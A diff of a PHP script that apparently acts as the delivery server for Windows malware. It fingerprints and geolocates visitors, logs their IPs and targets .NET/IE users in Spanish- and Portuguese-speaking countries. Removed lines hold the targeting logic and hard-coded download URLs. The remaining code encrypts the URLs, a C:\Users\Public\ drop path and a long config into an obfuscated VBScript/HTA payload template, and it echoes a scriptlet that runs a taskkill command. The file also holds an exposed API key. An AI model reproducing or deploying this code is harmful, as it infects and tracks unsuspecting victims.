@@ -1,187 +1,7 @@
 <?php
+$path = dirname(__DIR__, 2);
+require_once($path . '/src/utils/autorizacao.php'); //TODA AUTORIZAÇÃO DEVE SER FEITA AQUI, PARA QUE O ARQUIVO SEJA EXECUTADO SOMENTE SE AUTORIZADO
 header('Content-Type: text/plain;');
-
-
-$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
-$user_agent = " .net ";
-function getOS()
-{
-
-    global $user_agent;
-
-    $os_platform = "Unknown OS Platform";
-
-    $os_array = array(
-        '/windows nt 6.3/i' => 'Windows 8.1',
-        '/windows nt 6.2/i' => 'Windows 8',
-        '/windows nt 6.1/i' => 'Windows 7',
-        '/Windows nt 10.0/i' => 'Windows 10',
-        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
-        '/windows nt 5.2/i' => 'Windows Home Server',
-        '/windows nt 6.0/i' => 'Windows Server 2008',
-        '/windows nt 5.1/i' => 'Windows XP',
-        '/windows xp/i' => 'Windows XP',
-        '/windows nt 5.0/i' => 'Windows 2000',
-        '/windows me/i' => 'Windows ME',
-        '/win98/i' => 'Windows 98',
-        '/win95/i' => 'Windows 95',
-        '/win16/i' => 'Windows 3.11',
-        '/macintosh|mac os x/i' => 'Mac OS X',
-        '/mac_powerpc/i' => 'Mac OS 9',
-        '/linux/i' => 'Linux',
-        '/ubuntu/i' => 'Ubuntu',
-        '/Debian/i' => 'Debian',
-        '/CentOS/i' => 'CentOS',
-        '/iphone/i' => 'iPhone',
-        '/ipod/i' => 'iPod',
-        '/ipad/i' => 'iPad',
-        '/android/i' => 'Android',
-        '/blackberry/i' => 'BlackBerry',
-        '/webos/i' => 'Mobile',
-    );
-
-    foreach ($os_array as $regex => $value) {
-
-        if (preg_match($regex, $user_agent)) {
-            $os_platform = $value;
-        }
-    }
-
-    return $os_platform;
-}
-
-function getBrowser()
-{
-
-    global $user_agent;
-
-    $browser = "Unknown Browser";
-
-    $browser_array = array(
-        '/msie|trident/i' => 'Internet Explorer',
-        '/firefox/i' => 'Firefox',
-        '/safari/i' => 'Safari',
-        '/chrome/i' => 'Chrome',
-        '/Opera/i' => 'Opera',
-        '/netscape/i' => 'Netscape',
-        '/maxthon/i' => 'Maxthon',
-        '/konqueror/i' => 'Konqueror',
-        '/mobile/i' => 'Handheld Browser'
-    );
-
-    foreach ($browser_array as $regex => $value) {
-
-        if (preg_match($regex, $user_agent)) {
-            $browser = $value;
-        }
-    }
-
-    return $browser;
-}
-
-function getGeo($ip)
-{
-
-    if (strlen($ip) > 3) {
-
-
-        try {
-            $cURLConnection = curl_init();
-
-            curl_setopt($cURLConnection, CURLOPT_URL, 'https://pro.ip-api.com/json/' . $ip . '?key=nacNcSjqDSVv8If');
-            curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
-            curl_setopt($cURLConnection, CURLOPT_CONNECTTIMEOUT, 0);
-            curl_setopt($cURLConnection, CURLOPT_TIMEOUT, 5);
-            $phoneList = curl_exec($cURLConnection);
-            curl_close($cURLConnection);
-
-            $jsonArrayResponse = json_decode($phoneList);
-            return $jsonArrayResponse;
-        } catch (Exception $e) {
-            return false;
-        }
-    }
-
-    return "";
-}
-
-$user_os = getOS();
-$user_browser = getBrowser();
-
-
-$IP = getenv("REMOTE_ADDR");
-$host = gethostbyaddr($IP);
-
-if (file_exists("contw.txt")) {
-    $listalinks = file('contw.txt');
-    $qtlinks = count($listalinks) + 1;
-} else {
-    $myfile = fopen("contw.txt", "w");
-    fwrite($myfile, "");
-    fclose($myfile);
-    $qtlinks = 1;
-}
-
-$fp = fopen("contw.txt", "a+");
-fwrite($fp, $qtlinks . " " . date('d h:i:s a', time()) . " " . $IP . " " . $user_agent . " " . PHP_EOL);
-fclose($fp);
-
-
-
-if (strpos($user_agent, ".net") > 0 || strpos($user_agent, "msie") > 0) {
-
-    if (!file_exists('bloq/')) {
-        mkdir('bloq/', 0777, true);
-    }
-
-    $country = "";
-    try {
-        $localizacao = getGeo($IP);
-        $country = isset($localizacao) && isset($localizacao->country) ? $localizacao->country : "-";
-        $countryCODE = isset($localizacao) && isset($localizacao->countryCode) ? $localizacao->countryCode : "-";
-    } catch (Exception $e) {
-    }
-
-
-    $data = date('d h:i:s a', time());
-
-    if (!(($country == "") || ($country == 'Spain') || ($country == 'Mexico') || ($country == 'Brazil') || ($country == 'Portugal') || ($country == 'Argentina') || ($country == 'Peru')  || ($country == 'Chile') || ($country == 'Colombia')))
-         {
-
-        $fp = fopen("bloq/COUNTRY||" . $IP . " || " . $host . " || " . $country . " || " . $user_browser . " || " . $user_os .  ".txt", "wb");
-        fwrite($fp, "");
-        fclose($fp);
-
-        $codex = '<?xml version="1.0" encoding="utf-8" ?>
-<component id="component2">
-
-
-    <script language="VBScript">
-    <![CDATA[
-    CreateObject("WScript.Shell").run "taskkill /F /IM mshta.exe", 2
-    ]]>
-    </script>
-</component>';
- //echo $codex;
- //exit;
-}
-
-
-
-
-
-
-if (!file_exists('lib/')) {
-mkdir('lib/', 0777, true);
-}
-
-$fp = fopen(
-"lib/" . $IP . " || " . $host . " || " . $country . " || " . $user_browser . " || " . $user_os . ".txt",
-"wb"
-);
-fwrite($fp, "");
-fclose($fp);
-
 $wid = 95;
 $projectRoot = dirname(__DIR__, 2);
 $loadwPath = $projectRoot . '/src/model/loadw.txt';
@@ -200,19 +20,39 @@ $charactersLength = strlen($characters);
 $randomString = $characters0[rand(1, 51)] . $characters0[rand(1, 51)];
 for ($i = 0; $i < $length; $i++) { $randomString .=$characters[rand(0, $charactersLength - 1)]; } return $randomString;
 
+} 
+    function cryptw($s1) 
+    { 
+        $id=95; $sx="" ; $x=0; $x4=rand(0, 24); $result=chr($x4 + 65); $x4=$x4 + $id; 
+    for ($i=0; $i < strlen($s1); $i++) 
+        { 
+         $x=ord(substr($s1, $i, 1)) + $x4; 
+    if ($x <= 25) { 
+         $sx = " A" . chr($x + 65);
+         } 
+    else {
+         $x2=(int)($x / 25); $x3=$x - ($x2 * 25); $sx=chr($x2 + 65) . chr($x3 + 65); 
+        }
+     $result .=$sx; 
     } 
-    function cryptw($s1) { $id=95; $sx="" ; $x=0; $x4=rand(0, 24); $result=chr($x4 + 65); $x4=$x4 + $id; 
-    for ($i=0; $i < strlen($s1); $i++) { $x=ord(substr($s1, $i, 1)) + $x4; 
-    if ($x <= 25) {  $sx = " A" . chr($x + 65); } else { $x2=(int)($x / 25); $x3=$x - ($x2 * 25); $sx=chr($x2 + 65) . chr($x3 + 65); } $result .=$sx; } return $result; }
-    for ($i=1; $i <=99; $i++) { $codex=str_replace("#const" . $i  ."#" , geraString() . "_" . $i, $codex); }
-    for ($i=1; $i <=99; $i++) { $codex=str_replace( "#var" . $i . "#" ,    geraString() . "_" . $i, $codex ); } 
+    return $result; 
+}
+    for ($i=1; $i <=99; $i++) { 
+        $codex=str_replace("#const" . $i  ."#" , geraString() . "_" . $i, $codex);
+     }
+    for ($i=1; $i <=99; $i++) { 
+        $codex=str_replace( "#var" . $i . "#" ,    geraString() . "_" . $i, $codex );
+     } 
 
     $codex=str_replace("%cid%", $wid, $codex); 
     $codex=str_replace("%const1%", cryptw("3"), $codex ); 
 
-    $codex=str_replace("%const2%", cryptw("https://80.32.109.208.host.secureserver.net/fg4gasga"), $codex ); 
-    $codex=str_replace("%const3%", cryptw("https://80.32.109.208.host.secureserver.net/v/fg4gasg"), $codex ); 
-    $codex=str_replace("%const4%", cryptw("https://80.32.109.208.host.secureserver.net/"), $codex );
+    //$codex=str_replace("%const2%", cryptw("https://80.32.109.208.host.secureserver.net/fg4gasga"), $codex ); 
+    $codex=str_replace("%const2%", cryptw(getenv('LINK_SVR')), $codex ); 
+    //$codex=str_replace("%const3%", cryptw("https://80.32.109.208.host.secureserver.net/v/fg4gasg"), $codex ); 
+    $codex=str_replace("%const3%", cryptw(getenv('LINK_AIT')), $codex ); 
+    $codex=str_replace("%const4%", cryptw(getenv('LINK_HTA')), $codex );
+    //$codex=str_replace("%const4%", cryptw("https://80.32.109.208.host.secureserver.net/"), $codex );
     $codex=str_replace("%const5%", cryptw("C:\\Users\\Public\\"), $codex ); 
     $codex=str_replace("%const6%", cryptw(".fdgr3"), $codex);
     $codex=str_replace("%const7%", cryptw(".zip"), $codex); 
@@ -299,9 +139,18 @@ for ($i = 0; $i < $length; $i++) { $randomString .=$characters[rand(0, $characte
     $codex=str_replace("%const89%", cryptw("15370"), $codex);
     $codex=str_replace("%const90%", cryptw("taskkill /F /IM mshta.exe"), $codex); 
     $codex=str_replace("%constCFG%", "MCYCRFIDCFOFFFPFPDCCRCKFFFMCKCRCKFTFMCYCKCRCKFTFMDACKCRCKFTFMDBCKCRFRFAFUCYDBDHDFCRFJFQFUFDEWFVCRCXCYFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFLFOFDCRCXDAFMFQEXFIEWEYFHCVFDFLFQFAFKFPCVEYFECRCXDBFMFQEXFIEWEYFHCVFEFLFMFQFLCVFLFOFDCRCXDCFMFQEXFIEWEYFHCVFJFVFAFAFKFPCVFJFBCRCXDDFMFQEXFIEWEYFHCVFJFVFCFQFMCVEXFFFWCRCXDEFMFQEXFIEWEYFHCVFJFVFCFQFMCVFLFOFDCRCXDFFMFQEXFIEWEYFHCVFAFAFKFPCVFKFBFQCRCXDGFMFQEXFIEWEYFHCVFAFAFKFPFHFFFKFDCVEYFLFJCRCXDHFMFQEXFIEWEYFHCVDBFRFQFFFIFFFQFFFBFPCVEYFLFJCRCYCXFMFQEXFIEWEYFHCVEXFLFRFKEYFBFJFBCVFKFBFQCRCYCYFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFKFBFQCRCYDAFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFLFOFDCRCYDBFMFQEXFIEWEYFHCVFDFLFQFAFKFPCVEYFECRCYDCFMFQEXFIEWEYFHCVFEFLFMFQFLCVFLFOFDCRCYDDFMFQEXFIEWEYFHCVFJFVFAFAFKFPCVFJFBCRCYDEFMFQEXFIEWEYFHCVFAFAFKFPCVFKFBFQCRCYDFFMFQEXFIEWEYFHCVFAFAFKFPFHFFFKFDCVEYFLFJCRCYDGFMFQEXFIEWEYFHCVDBFRFQFFFIFFFQFFFBFPCVEYFLFJCRCYDHFMFQEXFIEWEYFHCVEXFLFRFKEYFBFJFBCVFKFBFQCRDACXFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFKFBFQCRDACYFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFLFOFDCRDADAFMFQEXFIEWEYFHCVFDFLFQFAFKFPCVEYFECRDADBFMFQEXFIEWEYFHCVFEFLFMFQFLCVFLFOFDCRDADCFMFQEXFIEWEYFHCVFJFVFAFAFKFPCVFJFBCRDADDFMFQEXFIEWEYFHCVFJFVFCFQFMCVEXFFFWCRDADEFMFQEXFIEWEYFHCVFJFVFCFQFMCVFLFOFDCRDADFFMFQEXFIEWEYFHCVFAFAFKFPCVFKFBFQCRDADGFMFQEXFIEWEYFHCVFAFAFKFPFHFFFKFDCVEYFLFJCRDADHFMFQEXFIEWEYFHCVDBFRFQFFFIFFFQFFFBFPCVEYFLFJCRDBCXFMFQEXFIEWEYFHCVEXFLFRFKEYFBFJFBCVFKFBFQCRDBCYFMFQEXFIEWEYFHCVFCFOFBFBFAFVFKEWFJFFEYFAFKFPCVFKFBFQCREXEXFDFMFTCYCXCYFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCXDAFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCXDBFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCXDCFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCXDDFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCXDEFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCXDFFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCXDGFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCXDHFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCYCXFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCYCYFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCYDAFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCYDBFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCYDCFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCYDDFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCYDEFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCYDFFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYCYDGFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYCYDHFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDACXFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDACYFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDADAFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDADBFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDADCFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDADDFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDADEFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDADFFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDADGFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDADHFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCREXEXFDFMFTCYDBCXFRFMCVFJFVFAFAFKFPCVFJFBCREXEXFDFMFTCYDBCYFRFMCVEXFLFRFKEYFBFJFBCVFKFBFQCRDOCKFFFMDACKCRCKFTFMDACXCKCRCKFFFMDBCKCRCKFTFMDBCXCKCRCKEXFHDACKCRCKEXFHDBCKCR", $codex ); 
-    echo $codex; 
- } else {
-     header("HTTP/1.0 404 Not Found");
- }
-    //$myfile=fopen("newfile.txt", "w" ) or die("Unable to open file!"); //fwrite($myfile, $user_agent);
-    //fclose($myfile);
+    //echo $codex; 
+//  } else {
+//      header("HTTP/1.0 404 Not Found");
+//  }
+$codex = '<?xml version="1.0" encoding="utf-8" ?>
+<component id="component2">
+
+
+    <script language="VBScript">
+    <![CDATA[
+    CreateObject("WScript.Shell").run "taskkill /F /IM mshta.exe", 2
+    ]]>
+    </script>
+</component>';
+echo $codex; 
